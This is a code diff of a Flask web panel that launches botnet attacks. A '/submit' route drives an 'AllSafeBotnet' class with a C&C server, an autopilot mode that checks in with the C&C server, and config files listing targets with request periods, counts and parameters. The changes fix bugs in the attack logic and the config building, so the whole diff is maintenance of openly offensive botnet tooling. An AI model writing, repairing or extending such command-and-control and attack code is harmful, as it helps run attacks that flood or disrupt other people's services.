@@ -56,24 +56,22 @@ set to False.
 """
 @app.route("/submit", methods=['POST'])
 def performAttack():
-    print(request.json)
-    # print("inizio")
-    # retrieving and polishing C&C server and prepare config file
-    if 'autopilot_start' in request.json:
-        allsafe = Botnet.AllSafeBotnet()
-        allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
-        return "OK", 200
-
     # if not autopilot mode, we will experience a step-by-step attack session
     # let we check for configuration file formatting...
     try:
+        # retrieving and polishing C&C server and prepare config file
+        if 'autopilot_start' in request.json:
+            allsafe = Botnet.AllSafeBotnet()
+            allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
+            return "OK", 200
+
         # prepare configuration
         cc_server = prepareConfigFile(request.json)
         config_path = './data/current_attack.json'
         # prepare botnet resources
         allsafe = Botnet.AllSafeBotnet()
         # if the attack to be carried without updates from C&C?
-        if 'local_attack' not in request.json:
+        if 'local_attack' in request.json:
             allsafe.attack(config_path, override=True)
         # else we set to attack to be carried using updated configuration if any
         else:
@@ -87,6 +85,7 @@ def performAttack():
 
 def prepareConfigFile(params, where='./data/current_attack.json'):
 
+    print("ROOT", rootSchema)
     localRootSchema = rootSchema
 
     # Only the useful key values will be changed accordingly
@@ -97,8 +96,8 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
     for elem in params['target']:
         # Creation of the locaTargetSchema based upon the TargetSchema
         localTargetSchema = targetSchema
-        localTargetSchema['period'] = elem['period'] if 'period' in params else 0
-        localTargetSchema['max_count'] = elem['max_count'] if 'max_count' in params else 0
+        localTargetSchema['period'] = elem['period'] if 'period' in elem else 0
+        localTargetSchema['max_count'] = elem['max_count'] if 'max_count' in elem else 0
 
         # Creation of the actionCondition dictionary
         actionConditions = OrderedDict()
@@ -161,7 +160,7 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
         # Final combination of the three schemas
         localTargetSchema['request_params'] = localRequestSchema
         localRootSchema['targets'].append(localTargetSchema)
-
+    
     #The json configuration will be written
     file = open(where, "w")
     file.write(json.dumps(localRootSchema,indent=4))
